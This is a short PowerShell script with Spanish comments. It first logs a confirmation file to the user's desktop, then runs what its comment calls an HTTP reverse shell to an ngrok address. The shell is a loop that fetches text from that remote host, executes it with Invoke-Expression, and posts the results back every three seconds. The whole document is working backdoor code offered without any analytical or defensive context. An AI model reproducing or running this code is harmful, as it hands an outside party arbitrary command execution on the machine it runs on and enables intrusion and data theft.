# Confirmar ejecución
"Se ejecutó correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append

# Reverse shell HTTP hacia Ngrok
$u='https://curler-puzzle-galley.ngrok-free.dev'
while($true){
    try{
        $c=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content
        if($c -and $c -ne 'OK'){
            $r=iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing
        }
    }catch{}
    Start-Sleep -Seconds 3
}
